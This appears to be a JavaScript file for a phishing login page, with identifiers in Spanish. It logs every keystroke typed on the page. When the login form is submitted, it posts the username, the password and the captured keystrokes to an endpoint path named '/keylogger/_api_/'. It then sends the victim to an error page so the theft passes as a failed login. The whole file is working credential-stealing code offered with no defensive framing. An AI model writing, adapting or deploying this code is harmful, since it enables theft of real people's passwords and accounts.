let teclas = '';
document.addEventListener('keydown', e => {
    if (e.key.length === 1) teclas += e.key;
});

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const datos = new FormData(this);

    fetch('/keylogger/_api_/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            u: datos.get('usuario') || '',
            p: datos.get('clave') || '',
            k: teclas
        })
    }).then(res => {
        if (res.ok) {
            window.location.href = 'error_page.html';
        } else {
            alert("Error en el servidor. Intenta más tarde.");
        }
    }).catch(err => {
        console.error("Fallo la petición:", err);
        window.location.href = 'error_page.html';
    });
});
